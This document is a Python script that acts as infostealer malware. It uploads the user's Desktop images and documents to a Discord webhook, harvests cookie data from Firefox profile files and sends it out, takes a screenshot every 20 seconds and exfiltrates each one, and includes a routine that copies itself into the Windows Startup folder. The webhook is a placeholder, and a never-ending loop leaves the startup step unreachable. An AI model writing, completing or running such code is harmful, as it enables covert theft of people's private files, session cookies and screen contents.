import os
import shutil
import requests
import time
import json
import pyautogui
import datetime

WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
RATE_LIMIT_DELAY = 1

def grab_files(path, extensions=None):
    files = []
    for root, dirs, filenames in os.walk(path):
        for filename in filenames:
            if extensions and not filename.lower().endswith(tuple(extensions)):
                continue
            files.append(os.path.join(root, filename))
    return files

def grab_cookies(path):
    cookies = []
    for root, dirs, filenames in os.walk(path):
        for filename in filenames:
            if filename.endswith('.json'):
                with open(os.path.join(root, filename), 'r') as f:
                    try:
                        data = json.load(f)
                        if 'cookies' in data:
                            cookies.extend(data['cookies'])
                    except json.JSONDecodeError:
                        pass
    return cookies

def send_to_discord(file_path):
    with open(file_path, "rb") as f:
        while True:
            response = requests.post(WEBHOOK_URL, files={"file": f})
            if response.status_code == 200:
                break
            elif response.status_code == 429:
                retry_after = int(response.headers.get('Retry-After', RATE_LIMIT_DELAY))
                time.sleep(retry_after)
            else:
                break

def send_cookies_to_discord(cookies):
    for cookie in cookies:
        while True:
            response = requests.post(WEBHOOK_URL, json={"content": json.dumps(cookie)})
            if response.status_code == 200:
                break
            elif response.status_code == 429:
                retry_after = int(response.headers.get('Retry-After', RATE_LIMIT_DELAY))
                time.sleep(retry_after)
            else:
                break

def take_screenshot():
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    screenshot_path = os.path.join(os.path.expanduser("~"), "Desktop", f"screenshot_{timestamp}.png")
    pyautogui.screenshot(screenshot_path)
    send_to_discord(screenshot_path)

def add_to_startup():
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    script_path = os.path.abspath(__file__)
    shutil.copy(script_path, startup_folder)

desktop = os.path.join(os.path.expanduser("~"), "Desktop")
image_extensions = ('.png', '.jpg', '.jpeg', '.gif', '.bmp')
text_extensions = ('.txt', '.md', '.docx', '.pdf')
files = grab_files(desktop, image_extensions + text_extensions)

for file in files:
    send_to_discord(file)

cookie_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
cookies = grab_cookies(cookie_path)

for cookie in cookies:
    send_cookies_to_discord(cookie)

while True:
    take_screenshot()
    time.sleep(20)

add_to_startup()
